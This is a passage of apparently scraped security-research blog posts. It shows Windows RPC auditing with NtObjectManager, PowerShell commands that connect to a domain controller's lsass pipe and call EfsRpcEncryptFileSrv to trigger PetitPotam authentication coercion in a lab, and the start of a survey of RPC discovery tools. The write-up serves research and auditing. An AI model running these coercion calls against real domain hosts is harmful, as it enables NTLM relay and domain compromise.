have procedures that accept the selected type:PS C:\\Users\\user&gt; $allrpc | Select-RpcServer -SystemHandle -SystemHandleType FileName UUID Ver Procs EPs Service Running---- ---- --- ----- --- ------- -------CmService.dll f1c37891-201f-4aa3-94b1-a5d131b04920 1.0 46 1 CmService Truednsrslvr.dll 45776b01-5956-4485-9f80-f428f7d60129 2.0 29 0 Dnscache TrueFrameServer.dll 6ddfc7d1-7fca-44eb-a279-e9988f4db32b 1.0 32 0 FrameServer FalsePhoneService.dll 8be456ec-9244-4d10-88e8-1ddf1baa9ade 1.0 70 0 PhoneSvc Falsewinhttp.dll 3473dd4d-2e88-4006-9cba-22570909dd10 5.1 12 2 WinHttpAutoProxySvc TrueOK. We can use NtObjectManager to enumerate and discover RPC servers. What else can we do?Use NtObjectManager to decomplile an IDL File from the EFS RPC interface (used in PetitPotam)From IDL to RPC binaryFor those of you, like me, new to RPC and its concepts, RPC development (as I have read) usually begins with the creation of an interface definition file (IDL). This IDL file is input for the a MIDL compiler that generates the C/C++ client and server stubs necessary to support the RPC runtime and programming model of RPC.flowchart LR;a[sample.idl] --&gt; b[MIDL Compiler];b --&gt; c[\"sample_s.c (server stub)\"];b --&gt; d[\"sample_c.c (client stub)\"];b --&gt; e[sample.h]subgraph MIDL output c d eendThe developer then needs to create their client and server code (client.c and server.c) and include the header generated by the MIDL compiler. From there, compile the client and server with the MIDL output, link the RPC runtime libraries, and build the RPC server and client binaries.flowchart LR;a[\"MIDL Output (.h + stubs)\"] --&gt; b[C/C++ Compiler];b1[server.c] --&gt; b;b2[procs.c] --&gt; b;b --&gt; d[Linker];e[Rpcrt4.lib] --&gt; d;d --&gt; f[RPCserver.exe];From RPC server to IDLIn the last post we studied how to dig into those RPC server binaries to find RPC data structures that define interfaces and procedures. From this comes the idea that the original IDL file (that defines the interfaces and procedures) can be recreated (or decompiled) from those data structures.flowchart LR;f[RPCserver.exe] --&gt; g[NDR Parser] --&gt; h[IDL];RpcView uses the data structures (RPC_SERVET_T RPC_INTERFACE_T, etc.) to build out its RpcDecompilerInfo_T used to decompile its IDL files. It isn’t perfect. When dealing with IDL files generated by RpcView, this kind of error should be expected as the “decompilation” process is not supposed to produce an 100% usable result, straight out of the box. With time and practice though, you can quickly spot these issues and fix them. from-rpcview-to-petitpotamNtObjectManager doesn’t claim to be perfect either. Even if the decompiler was perfect (and RpcView or my own in my NtObjectManager PowerShell module are definitely not) the original IDL to NDR compilation process is lossy. Reversing this process with a decompiler doesn’t always produce a 100% correct IDL file and thus the regenerated NDR might not be 100% compatible. Finding Windows RPC Client Implementations Through Brute ForceIt does however claim to support a few more of the complex procedure parameters. However, it’s [RpcView] all written in C/C++ so couldn’t be easily used in a .NET application and the IDL generation is incomplete (such as missing support for system handles and some structure types) and not ideal for our purposes as parsing a text format would be more complicated. Calling Local Windows RPC Servers from .NETYou can build your own IDL with Format-RpcServer.PS C:\\Users\\user&gt; $efsrpc | Format-RpcServer// DllOffset: 0x11880// DllPath C:\\Windows\\system32\\efslsaext.dll// Complex Types:/* Memory Size: 16 */struct Struct_0 { /* Offset: 0 */ int Member0; /* Offset: 8 */ /* C:(FC_POINTER_CONFORMANCE)(0)(FC_ZERO)(FC_ULONG)(Early, Range) */ /* unique */struct Struct_1*[] Member8;};/* Memory Size: 32 */struct Struct_1 { /* Offset: 0 */ int Member0; /* Offset: 8 */ /* unique */struct Struct_2* Member8; /* Offset: 16 */ /* unique */struct Struct_4* Member10; /* Offset: 24 */ /* unique */wchar_t* Member18;};/* Memory Size: 8 */struct Struct_2 { /* Offset: 0 */ sbyte Member0; /* Offset: 1 */ sbyte Member1; /* Offset: 2 */ struct Struct_3 Member2; /* Offset: 8 */ /* C:(FC_NORMAL_CONFORMANCE)(-7)(FC_ZERO)(FC_USMALL)(Early) */ int[] Member8;};#several lines omittedI tried compiling it (with the MIDL compiler), but it gave me the same errors that RpcView’s decompiled IDL. The thing about NtObjectManager, although it has the ability to generate IDL files, but it isn’t really necessary when using the tool. The reason being it can generate C# RPC clients on the fly!Build a RPC client to flex the EFS RPC interfaceItm4n walks through the creation of an RPC client built with Visual Studio. NtObjectManager obviates that entire step by dynamically building a client from the parsed NtApiDotNet.Win32.RpcServer. I would explain more of how this dynamic client generation works, but I’m still wrapping my head around this. The code says it is building (or compiling) a C# assembly in memory. Within it’s RpcClientBuilder class it has reference to the RpcServer containing all the data parsed out from the RpcServer as we walked through before. The RpcClientBuilder initialization seems to parse out NDR types just as the RpcView decompiler code was doing. After that I get a bit lost, but it seems to dynamically generate source code and then compile it. Making it immediately available in Powershell.Accepting I don’t understand it fully, let’s head back to Powershell where we select our server once again.Building a clientThe client is built from the parsed RPC server.PS C:\\Users\\user&gt; $efsrpc = $allrpc | ? { $_.InterfaceId -eq 'c681d488-d850-11d0-8c52-00c04fd90f7e' }PS C:\\Users\\user&gt; $efsrpcName UUID Ver Procs EPs Service Running---- ---- --- ----- --- ------- -------efslsaext.dll c681d488-d850-11d0-8c52-00c04fd90f7e 1.0 21 0 FalsePS C:\\Users\\user&gt; $client = Get-RpcClient $efsrpcPS C:\\Users\\user&gt; $client New : _ConstructorsNewArray : _Array_ConstructorsConnected : FalseEndpoint :ProtocolSequence :ObjectUuid : 00000000-0000-0000-0000-000000000000InterfaceId : c681d488-d850-11d0-8c52-00c04fd90f7eInterfaceVersion : 1.0Transport :After the client is built, we need to connect it to the RPC server to call the procedures.PS C:\\Users\\user&gt; Connect-RpcClient $clientException calling \"Connect\" with \"4\" argument(s): \"Can't find endpoint for c681d488-d850-11d0-8c52-00c04fd90f7e 1.0 with protocol sequence ncalrpc\"At C:\\Program Files\\WindowsPowerShell\\Modules\\NtObjectManager\\1.1.33\\NtObjectManager.psm1:14143 char:17+ ... $Client.Connect($ProtocolSequence, $EndpointPath, $Networ ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : ArgumentExceptionWell the error is pretty clear. From the $client output there was no endpoint or protocol derived from the parsing of the RPC server.We can cheat for this because we have read @itm4n article or have browsed petitpotam code and we know that the efsrpc interface is available here: ID of the interface: c681d488-d850-11d0-8c52-00c04fd90f7e Protocol sequence: ncacn_np Name of the endpoint: \\pipe\\lsassSo we try to connect to the client once more, this time passing in the binding information.PS C:\\Users\\user&gt; Connect-RpcClient -Client $Client -ProtocolSequence ncacn_np -EndpointPath \"\\pipe\\lsass\"PS C:\\Users\\user&gt; $clientNew : _ConstructorsNewArray : _Array_ConstructorsConnected : TrueEndpoint : \\??\\pipe\\lsassProtocolSequence : ncacn_npObjectUuid : 00000000-0000-0000-0000-000000000000InterfaceId : c681d488-d850-11d0-8c52-00c04fd90f7eInterfaceVersion : 1.0Transport : NtApiDotNet.Win32.Rpc.Transport.RpcNamedPipeClientTransportPS C:\\Users\\user&gt; $client.ConnectedTrueYou have to admit, if you are going for speed, you would use NtObjectManager instead of Visual Studio to build your client. :)Flexing the interface to call the procedureOK, now we have a connected RPC client. What procedures are available?PS C:\\Users\\user&gt; $client | gm TypeName: ClientName MemberType Definition---- ---------- ----------Connect Method void Connect(NtApiDotNet.Win32.RpcEndpoint endpoint, NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity transport_security), vo...Disconnect Method void Disconnect()Dispose Method void Dispose(), void IDisposable.Dispose()EfsRpcAddUsersToFileEx_Downlevel Method int EfsRpcAddUsersToFileEx_Downlevel(int p0, System.Nullable[Struct_8] p1, string p2, Struct_5 p3)EfsRpcAddUsersToFile_Downlevel Method int EfsRpcAddUsersToFile_Downlevel(string p0, Struct_5 p1)EfsRpcCloseRaw_Downlevel Method EfsRpcCloseRaw_Downlevel_RetVal EfsRpcCloseRaw_Downlevel(NtApiDotNet.Ndr.Marshal.NdrContextHandle p0)EfsRpcDecryptFileSrv_Downlevel Method int EfsRpcDecryptFileSrv_Downlevel(string p0, int p1)EfsRpcDuplicateEncryptionInfoFile_Downlevel Method int EfsRpcDuplicateEncryptionInfoFile_Downlevel(string p0, string p1, int p2, int p3, System.Nullable[Struct_8] p4, int p5)EfsRpcEncryptFileSrv_Downlevel Method int EfsRpcEncryptFileSrv_Downlevel(string p0)EfsRpcFileKeyInfoEx_Downlevel Method EfsRpcFileKeyInfoEx_Downlevel_RetVal EfsRpcFileKeyInfoEx_Downlevel(int p0, System.Nullable[Struct_8] p1, string p2, int p3)EfsRpcFileKeyInfo_Downlevel Method EfsRpcFileKeyInfo_Downlevel_RetVal EfsRpcFileKeyInfo_Downlevel(string p0, int p1)EfsRpcFlushEfsCache_Downlevel Method int EfsRpcFlushEfsCache_Downlevel()EfsRpcGenerateEfsStream_Downlevel Method EfsRpcGenerateEfsStream_Downlevel_RetVal EfsRpcGenerateEfsStream_Downlevel()EfsRpcGetEncryptedFileMetadata_Downlevel Method EfsRpcGetEncryptedFileMetadata_Downlevel_RetVal EfsRpcGetEncryptedFileMetadata_Downlevel(string p0)EfsRpcNotSupported_Downlevel Method int EfsRpcNotSupported_Downlevel(string p0, string p1, int p2, int p3, System.Nullable[Struct_8] p4, int p5)EfsRpcOpenFileRaw_Downlevel Method EfsRpcOpenFileRaw_Downlevel_RetVal EfsRpcOpenFileRaw_Downlevel(string p1, int p2)EfsRpcQueryRecoveryAgents_Downlevel Method EfsRpcQueryRecoveryAgents_Downlevel_RetVal EfsRpcQueryRecoveryAgents_Downlevel(string p0)EfsRpcQueryUsersOnFile_Downlevel Method EfsRpcQueryUsersOnFile_Downlevel_RetVal EfsRpcQueryUsersOnFile_Downlevel(string p0)EfsRpcReadFileRaw_Downlevel Method EfsRpcReadFileRaw_Downlevel_RetVal EfsRpcReadFileRaw_Downlevel(NtApiDotNet.Ndr.Marshal.NdrContextHandle p0)EfsRpcRemoveUsersFromFile_Downlevel Method int EfsRpcRemoveUsersFromFile_Downlevel(string p0, Struct_0 p1)EfsRpcSetEncryptedFileMetadata_Downlevel Method int EfsRpcSetEncryptedFileMetadata_Downlevel(string p0, System.Nullable[Struct_8] p1, Struct_8 p2, System.Nullable[Struct_10] p3)EfsRpcSetFileEncryptionKey_Downlevel Method int EfsRpcSetFileEncryptionKey_Downlevel(System.Nullable[Struct_6] p0, int p1, int p2)EfsRpcWriteFileRaw_Downlevel Method int EfsRpcWriteFileRaw_Downlevel(NtApiDotNet.Ndr.Marshal.NdrContextHandle p0, byte[] p1)EfsUsePinForEncryptedFiles_Downlevel Method int EfsUsePinForEncryptedFiles_Downlevel(Struct_4 p0, Struct_9 p1)The original procedure used in PetitPotam was EfsRpcOpenFileRaw.The function signature for EfsRpcOpenFileRaw from the client says it only requires a string and an int. Easy enough to pass in a Powershell console.EfsRpcOpenFileRaw_Downlevel_RetVal EfsRpcOpenFileRaw_Downlevel(string p1, int p2)From MSDN we know:long EfsRpcOpenFileRaw( [in] handle_t binding_h, [out] PEXIMPORT_CONTEXT_HANDLE* hContext, [in, string] wchar_t* FileName, [in] long Flags);Again taking a look at PetitPotam and itm4n’s example, we gather some specifics about the parameters. We just need to pass in a UNC file path forFileName and null for the Flags.PS C:\\Users\\user&gt; $client.EfsRpcOpenFileRaw_Downlevel(\"\\\\127.0.0.1\\C$\\workspace\\all-your-RPC-are-belong-to-NtObjectManger.txt\",0)p0 retval-- ------Handle: 00000000-0000-0000-0000-000000000000 - Attributes: 0 5Hmm. Handle 0. retval 5. Does 5 == ERROR_ACCESS_DENIED?. Why???It took me four days to figure out why!Troubleshooting PetitPotamThere are a myriad of reasons any particular RPC call doesn’t succeed. To make a remote procedure call, a client must first bind (or connect) to the server, and then call the procedure. To connect to an RPC server, there might be security descriptor with criteria your client doesn’t meet, or specific server interface registration flags might prevent your client from connecting remotely. For the actual procedure to succeed, there might be a security callback function that you need to satisfy, or the RPC server might have its own custom checks built into the procedure itself. Ad hoc security checks, one of the changes to efslsaext.dll, is one of the many reasons our last attempt to call a procedure failed.The reason our call to EfsRpcOpenFileRaw_Downlevel didn’t work is because I am running this in 2022, and the efslsaext.dll (10.0.22000.556) has dramatically changed since the original PetitPotam (10.0.22000.132) and even since Forshaw gave us detailed information about the first patch to PetitPotam (10.0.22000.376).EfsRpcOpenFileRaw_Downlevel - Local calls not allowedThe connection I made above was to my local machine, the result of not specifying a remote address.PS C:\\Users\\user&gt; Connect-RpcClient -Client $Client -ProtocolSequence ncacn_np -EndpointPath \"\\pipe\\lsass\"Several Efs calls include a security check call to EfsRpcpValidateClientCall that will fail the procedure if you call it from a local context.void EfsRpcpValidateClientCall(RPC_BINDING_HANDLE Binding, PBOOL ValidClient) { unsigned int ClientLocalFlag; I_RpcBindingIsClientLocal(NULL, &amp;ClientLocalFlag); if (!ClientLocalFlag) { RPC_WSTR StringBinding; RpcBindingToStringBindingW(Binding, &amp;StringBinding); RpcStringBindingParseW(StringBinding, NULL, &amp;Protseq, NULL, NULL, NULL); if (CompareStringW(LOCALE_INVARIANT, NORM_IGNORECASE, Protseq, -1, L\"ncacn_np\", -1) == CSTR_EQUAL) *ValidClient = TRUE; } }}Explained by @tiraniddo: Basically the ValidClient parameter will only be set to TRUE if the caller used the named pipe transport and the pipe wasn’t opened locally, i.e. the named pipe was opened over SMB. This is basically all the security that’s being checked for. Therefore the only security that could be enforced is limited by who’s allowed to connect to a suitable named pipe endpoint.How to secure a Windows RPC Server, and how not toOK, local calls won’t work for any procedure that makes a call to EfsRpcpValidateClientCall. I will have to change the setup of my auditing. There was a remote procedure call that succeeded despite my client connection via localhost. It succeeded because the local check was absent and it simply returns a value.EfsRpcFileKeyInfoEx decompilation GhidraPS C:\\Users\\user&gt; $client.EfsRpcFileKeyInfoEx_Downlevel(2, $client.New.Struct_8(), 'test',1)p4 retval-- ------ 500x32 == 50OK, for the procedure we care about, we can solve the local connect problem by connecting to a remote machine… or so I thought.NtObjectManager Cheats with PipesHere is an attempt to connect to a pipe on a remote machine:PS C:\\Users\\user&gt; Connect-RpcClient -Client $client -StringBinding \"ncacn_np:192.168.0.20[\\\\pipe\\\\lsass]\"Exception calling \"Connect\" with \"2\" argument(s): \"(0xC000006D) - The attempted logon is invalid. This is either due to a bad username or authentication information.\"At C:\\Program Files\\WindowsPowerShell\\Modules\\NtObjectManager\\1.1.33\\NtObjectManager.psm1:14161 char:17+ $Client.Connect($StringBinding, $security)+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : NtExceptionReceived the exception. \"The attempted logon is invalid. This is either due to a bad username or authentication information.\". Oh right, just need to add valid creds…-Credentials $(Get-LsaCredential -UserName \"ABC\" -Domain \"DOMAIN\" -Password \"pwd\")PS C:\\Users\\user&gt; Connect-RpcClient -Client $client -StringBinding \"ncacn_np:192.168.0.20[\\\\pipe\\\\lsass]\" -Credentials $(Get-LsaCredential -UserName \"ABC\" -Domain \"DOMAIN\" -Password \"pwd\")Exception calling \"Connect\" with \"2\" argument(s): \"(0xC000006D) - The attempted logon is invalid. This is either due to a bad username or authentication information.\"At C:\\Program Files\\WindowsPowerShell\\Modules\\NtObjectManager\\1.1.33\\NtObjectManager.psm1:14161 char:17+ $Client.Connect($StringBinding, $security)+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : NtExceptionStill fails with valid credentials. It becomes a bit more clear looking at the attempted connection to the pipe over SMB.SMB Pipe Connection FailureEven when you supply credentials to Connect-RpcClient, NtObjectManager doesn’t use the username or password to connect to the pipe. It “cheats” a bit by relying on NtOpenFile to connect the pipe. SMB by default sends over your logged in user credentials when you call NtOpenFile with a UNC path. Impacket is able to set creds, but perhaps because it provides more low-level control of SMB? Again, this seems like an issue with the initial connection to the named pipe over SMB rather than NtObjectManager’s ability to use the RPC named pipe transport security on a connected client. Once connected, it properly leverages the RPC transport security and is able to set RPC authentication info. To workaround the initial pipe connection issue, we need to setup a remote machine with an account matching that of our client machine. More on that in a bit.EfsEnforceClientAuthentication - Ensure PACKET_PRIVACYYet another check was added to EfsRpcpValidateClientCall in efslsaext.dll (10.0.22000.556) to check for specific AuthInfo settings for the RPC client connection.undefined8 EfsEnforceClientAuthentication(void){ RPC_STATUS RVar1; undefined8 uVar2; undefined8 uVar3; ulong local_res8 [2]; RPC_AUTHZ_HANDLE local_res10 [3]; uVar3 = 0; local_res10[0] = (RPC_AUTHZ_HANDLE)0x0; uVar2 = 0; local_res8[0] = 0; RVar1 = RpcBindingInqAuthClientW ((RPC_BINDING_HANDLE)0x0,local_res10,(RPC_WSTR *)0x0,local_res8,(ulong *)0x0, (ulong *)0x0); if (RVar1 == 0) { // Check AuthenticationLevel == PACKET_PRIVACY if ((local_res8[0] != 6) &amp;&amp; (uVar3 = 5, _DAT_18001a910 == 0)) { fnEfsLogTrace1(uVar2,&amp;EFS_CLI_AUTH_INSECURE,5,0x15,4); _DAT_18001a910 = 1; } } else { if (_DAT_18001a910 == 0) { fnEfsLogTrace1(uVar2,&amp;EFS_CLI_AUTH_INSECURE,RVar1,0x15,4); _DAT_18001a910 = 1; } uVar3 = 5; } return uVar3;}Within the EfsEnforceClientAuthentication the Windows API, RpcBindingInqAuthClientW parses authentication info from the client connection.RPC_STATUS RpcBindingInqAuthClientW( RPC_BINDING_HANDLE ClientBinding, RPC_AUTHZ_HANDLE *Privs, RPC_WSTR *ServerPrincName, unsigned long *AuthnLevel, unsigned long *AuthnSvc, unsigned long *AuthzSvc);This connection check ensures that the AuthenticationLevel is PACKET_PRIVACY (6) for the connection with this line:(local_res8[0] != 6)When we setup our initial connection, we did not specify any of the authentication level required by this check.PS C:\\Users\\testguy&gt; Connect-RpcClient -Client $client -AuthenticationLevel PacketPrivacyEfsRpcOpenFileRaw_Downlevel Doesn’t ExistOK, so I have lied a bit. The reasons above for procedure call failure are true for most of the “downlevel” functions.efslsaext downlevel functionsEach procedure that actually provides useful functionality has added the ad hoc security via the EfsRpcpValidateClientCall check.EfsRpcpValidateClientCall-func-call-treeIt just so happens for efslsaext.dll (10.0.22000.556) and later, they just remove the EfsRpcOpenFileRaw_Downlevel procedure functionality.EfsRpcOpenFileRaw_Downlevel Decompliation from GhidraFor Server 2019 as well:EfsRpcOpenFileRaw_Downlevel Server 2019 Decompliation from GhidraPerhaps they have had enough of Petitpotam. Lucky for PetitPotam, other functions (such as EfsRpcEncryptFileSrv_Downlevel) that force NTLM relay are still available and a part of PetitPotam current implementation.EfsRpcEncryptFileSrv_Downlevel Decompliation from GhidraAll Your RPC are belong to NtObjectManagerOK, just to see this work end to end, I setup a Server 2019 domain controller and updated original efslsaext.dll 10.0.17763.1 to 10.0.17763.2686. This version is still vulnerable to PetitPotam. I had to create a domain user account to match that of my client to make sure my NtObjectManager dynamic client could still connect to the remote pipe despite the hiccup.And finally…PS C:\\Users\\testguy&gt; Connect-RpcClient -Client $client -StringBinding \"ncacn_np:192.168.0.20[\\\\pipe\\\\lsass]\" -AuthenticationLevel PacketPrivacy -AuthenticationType WinNT -Credentials $(Get-LsaCredential -UserName \"testguy\" -Domain \"domain\" -Password \"password\")PS C:\\Users\\testguy\\&gt; $clientNew : _ConstructorsNewArray : _Array_ConstructorsConnected : TrueEndpoint : \\??\\UNC\\192.168.0.20\\pipe\\lsassProtocolSequence : ncacn_npObjectUuid : 00000000-0000-0000-0000-000000000000InterfaceId : c681d488-d850-11d0-8c52-00c04fd90f7eInterfaceVersion : 1.0Transport : NtApiDotNet.Win32.Rpc.Transport.RpcNamedPipeClientTransportWe are connected. Let’s try PetitPotam vulnerable procedures.PS C:\\Users\\testguy\\&gt; $client.EfsRpcOpenFileRaw_Downlevel('\\\\127.0.0.1\\C$\\Workspace\\all-your-RPC-are-belong-to-NtObjectManger.txt',0)p0 retval-- ------Handle: 00000000-0000-0000-0000-000000000000 - Attributes: 0 5The return value for EfsRpcOpenFileRaw_Downlevel is 5 as expected.PS C:\\Users\\testguy\\&gt; $client.EfsRpcEncryptFileSrv_Downlevel('\\\\127.0.0.1\\C$\\test\\all-your-RPC-are-belong-to-NtObjectManger.txt')0The call to EfsRpcEncryptFileSrv_Downlevel returns 0 and triggers Petitpotam.ProcMon PetitPotam evidence via NtObjectManagerIn the Procmon output, you can see the call to CreateFile from lsass running as SYSTEM on the UNC patch specified in your RPC call EfsRpcEncryptFileSrv_Downlevel. In this way, PetitPotam forces an arbitrary host to authenticate to another machine, best explained by Itm4n: Of course, the NT AUTHORITY\\SYSTEM account cannot be used for network authentication. So, when invoking this procedure with a remote path on a domain-joined machine, Windows will actually use the machine account to authenticate on the remote server. This explains why “PetitPotam” is able to coerce an arbitrary Windows host to authenticate to another machine. from-rpcview-to-petitpotamWe made it!ConclusionThis concludes our journey into RPC auditing with NtObjectManager. If you made it this far, well done. It was a long trek, but hopefully you learned some things along the way.NtObjectManager is a powerful tool for RPC auditing and understanding. The ability to generate an RPC client dynamically (with no IDL file or MIDL compiler) and try out procedures on the fly is powerful. It doesn’t mean you won’t run into issues trying to troubleshoot a failed remote procedure call, but if it was easy, would it be fun?I hope you have a better idea of the available RPC enumeration tools and perhaps a head start on your next RPC auditing adventure with NtObjectManager.Please reach out @clearbluejar with questions or comments. Also appreciate any feedback or corrections you might have for the post.Cheers again to @itm4n for inspiration, @topotam for PetitPotam, and @tiraniddo for NtObjectManager.Cover photo by Leif Linding on Unsplash" }, { "title": "A Survey of Windows RPC Discovery Tools", "url": "/posts/surveying-windows-rpc-discovery-tools/", "categories": "windows, rpc", "tags": "rpcdump, rpcview, ntobjectmanager, impacket, NTLMrelay, rpc, windows", "date": "2022-06-02 05:11:00 +0000", "snippet": "TL;DR A survey of Windows Remote Procedure Call discovery tools and an attempt to understand how open source tools discover RPC servers, interfaces, and procedures.Windows RPC has been a black box for me for some time. This post is an attempt to leverage analysis of open source RPC tools to pry open that box. I started by reading MSDN, getting bored and then bouncing between several detailed security and research blog posts. Reading was my first step down the road of Windows RPC comprehension, and it helped me understand RPC at a high level. Microsoft Remote Procedure Call (RPC) defines a powerful technology for creating distributed client/server programs. The RPC run-time stubs and libraries manage most of the processes relating to network protocols and communication. This enables you to focus on the details of the application rather than the details of the network.-MSDNRPC is a way to standardize security and communication across either local or distributed clients and servers. Used in services to provide a separation of privileges (as it supports impersonation) or as means to provide secure communication across a network through available transports. It is prolific in Windows and therefore useful to understand for auditing or researching Windows.When I’m trying to understand something, reading is hardly ever enough. I often use writing as a tool for understanding (hence this blog). I find I can’t feign understanding in writing. This post will examine existing RPC discovery and enumeration tools hoping to understand each of the tools’ means for RPC discovery.Questions to consider: Which tools enumerate RPC? By what means can RPC servers (and clients) be found? What are the advantages and disadvantages of dynamic vs static tools? What approaches are used by the various RPC tooling?Evidence of RPCHere are some well-known ways to identify RPC within a binary. Look for the import of rpcrt4.dll Each binary that supports RPC will need to link against the RPC runtime (rpcrt4.dll) to support common RPC actions. The import of rpcrt4.dll may not be found in the binary of the server or application running RPC, it could be in a dependency DLL loaded at runtime with a RPC runtime dependency. This needs to be considered for the tooling looking for RPC, whether you attempt to discover RPC statically (by examining the binary) or dynamically (looking at a process at runtime). Query the RPC endpoint mapper - Windows runs a service known as the RPC Endpoint Mapper. If (and only if) a RPC server registers with the endpoint mapper via an Win32 API such as RpcEpRegister will the server be known to the RPC Endpoint Mapper.These common ways, mentioned in 0xcarsten’s RPC post here, are also alluded to in MSDN under linking and registering endpoints.Some of the less known ways include the walking of RPC data structures available both in the compiled RPC binary and in a RPC process memory at runtime. These methods, detailed below by tools like RpcView and NtObjectManager, provide the means to not only find RPC servers and clients but also derive the interfaces and procedures within the binary.RPC Tools - Discovering RPC Servers, Interfaces and ProceduresTo begin, we survey the landscape a bit to understand each tool’s heuristic for RPC discovery.RPCViewRpcViewRpcView discovers RPC servers already running on your host. It takes a dynamic (runtime) approach to discovery. RpcView starts by enumerating every running process and discovers the RPC interface, endpoint, and AuthInfo for each of the running RPC servers it detects. Finally, it displays the results in a nice GUI.RpcView GUICode Source: https://github.com/silverf0x/RpcViewAs far as I can tell by exploring the code related to enumerating interfaces is: EnumProcess - The EnumProcess function enumerates all the processes by iterating through all the PIDs within a current process snapshot (see CreateToolhelp32Snapshot). It is called when RpcView is initialized and again as the user clicks on the various widgets (interfaces, endpoints, processes) within the GUI to ensure that a fresh process listing is used. GetRpcServerAddressInProcess - For RpcView’s ability to enumerate RPC interfaces, endpoints, and all other RPC information, it first attempts to discover the global symbol GlobalRpcServer from the rpcrt4.dll (RPC runtime dll) loaded in the running processes address space. The GlobalRpcServer variable is a pointer to a root _RPC_SERVER_T data structure needed to unravel all related RPC information with a process. The GlobalRpcServer is found in the the .data section of the rpcrt4.dll, so for each running process, GetRpcServerAddressInProcess function searches through the entire .data section (brute force style) dereferencing one sizeof(void *) pointer at a time) until it finds the GlobalRpcServer data structure. It identifies the GlobalRpcServer symbol by leveraging RpcView’s heuristic to identify the symbol. Essentially, they are searching for a unique RPC GUID 8a885d04-1ceb-11c9-9fe8-08002b104860 known as the NDR Transfer Syntax Identifier. More details of this heuristic and RPC data structures are better explained by @_xpn_ in his analysis of RPCView.Once found, GlobalRpcServer is assigned and subsequently used as the starting point for the all functionality we care about (RpcCoreEnumProcessInterfaces, RpcCoreEnumProcessEndpoints, and RpcCoreEnumProcessAuthInfo). Each of these functions has a similar start. Open process for reading memory, populate the _RPC_SERVER_T data structure with the memory pointed to by GlobalRpcServer. BOOL __fastcall RpcCoreEnumProcessInterfaces(void* pRpcCoreCtxt,DWORD Pid,RpcCoreEnumProcessInterfacesCallbackFn_T RpcCoreEnumProcessInterfacesCallbackFn,void* pCallbackCtxt,ULONG InterfaceInfoMask) { HANDLE\t\t\t\t\thProcess; BOOL\t\t\t\t\tbResult=FALSE; RPC_SERVER_T\t\t\tRpcServer; UINT\t\t\t\t\ti; UINT\t\t\t\t\tSize; VOID PTR_T *\t\t\tpTable=NULL; VOID PTR_T\t\t\t\tpRpcServer; BOOL\t\t\t\t\tbContinue=TRUE; RpcInterfaceInfo_T*\t\tpRpcInterfaceInfo = NULL; RpcCoreInternalCtxt_T*\tpRpcCoreInternalCtxt=(RpcCoreInternalCtxt_T*)pRpcCoreCtxt; hProcess=ProcexpOpenProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION,FALSE,Pid); if (hProcess==NULL) goto End; if (!ReadProcessMemory(hProcess,pRpcCoreInternalCtxt-&gt;pGlobalRpcServer,&amp;pRpcServer,sizeof(VOID PTR_T),NULL)) goto End; GlobalRpcServer starting point within RpcCoreEnumProcessInterfaces assigned to RPC_SERVER_T data structure RpcCoreEnumProcessInterfaces - Enumerating RPC interfaces and procedures in a process. Starting with the GlobalRPCServer the basic objective is to dig into its _RPC_SERVER_T data structure to identify the RPC interface _RPC_INTERFACE_T data structures. RpcCoreEnumProcessInterfaces iterates through all the interfaces and pulls out detailed information via InternalGetInterfaceInfo. The InternalGetInterfaceInfo function copies data from process memory to populate a detailed RpcInterfaceInfo_T data structure used by RpcView to update the GUI. The RPC interface IDs and procedure address table are populated within this function. The procedure names for the interface are not available from process memory, but are later enriched by referencing the PDB symbols for the corresponding binary and the procedure address table to produce the procedure names (assuming symbols are configured). RpcCoreEnumProcessEndpoints - Enumerating RPC endpoints in a process. This function again relies on the base GlobalRPCServer data structure and iterates a simple array that holds the RPC endpoint information (specifically the name and protocol) for the endpoint. There can be more than one endpoint within a process. RpcCoreEnumProcessAuthInfo - Enumerate the AuthInfo in a RPC process. Just like the previous two, starting with GlobalRPCServer, iterating over the AuthInfo, and populating RpcView’s RpcAuthInfo_T data structure.ThoughtsRpcView’s runtime approach to RPC discovery has both advantages and disadvantages. An immediate disadvantage that comes to mind is that perhaps a server isn’t running? It could be missed. Some RPC servers are activated by some distinct action or trigger. If an RPC server isn’t running, then RpcView is blind to it. The counter is that what you see is what you get. There is no mystery or time wasted trying to figure out how to trigger a RPC server, because it is already running.Also, what about trying to open a handle to a process with a higher PPL than that of RpcView (even running as admin)? It wouldn’t be possible to open a handle to the process to analyze the runtime memory.An advantage to reading some of the RPC data structures at runtime is that it has access to interface registration flags and authentication info for the server. Some of the RPC specific information is not directly available in the compiled binary, IDL, or ACF file. When the server registers an interface, it passes a flag to the Windows APIRpcServerRegisterIf2. The registration flags configure the RPC server at runtime.RpcView AuthInfo (top) Registration Flags (bottom) GUINo other tool analyzed provides this information. This is helpful when trying to understand the connection requirements for a client binding to the server.NtObjectManagerNtObjectManagerNtObjectManager is the PowerShell module that exposes several RPC discovery methods (such as Get-RpcServer) (backed by its supporting .NET managed library NtApiDotNet). NtObjectManager goes about discovering RPC servers (and even clients) a bit differently. It does not look directly at running processes, but rather it will parse a list of PE files that you feed it to attempt to discover if the binary is an RPC server. It will then load each of those PE files and parse NDR data structures (think _RPC_SERVER_T and _RPC_INTERFACE_T from RpcView) found with the data section of RPC compiled binaries. From the data structures the RPC interfaces, endpoints, and procedures can also be discovered as in RpcView.Code Source: https://github.com/googleprojectzero/sandbox-attacksurface-analysis-toolsThe starting point for RPC server enumeration is the Get-RpcServer powershell cmdlet that takes a list of binaries as input to parse as RPC server objects.# Find all servers in SYSTEM32. PS C:\\Users\\user&gt; $rpc = ls \"C:\\Windows\\system32\\*\" -Include \"*.dll\",\"*.exe\" ` | Get-RpcServerFor NT Object Manager: This command does a heuristic search in a DLL’s data sections for RPC servers and clients and parses the NDR structures. You can use this to generate RPC server definitions similar to RpcView (but in my own weird C# pseudo-code syntax) but for this scenario we only care about the clients.- Finding Windows RPC Client Implementations Through…For each binary it calls out to the static method [NtApiDotNet.Win32.RpcServer]::ParsePeFile within NtApiDotNet. This is where all the magic happens, or at least where it begins. You might want to grab a 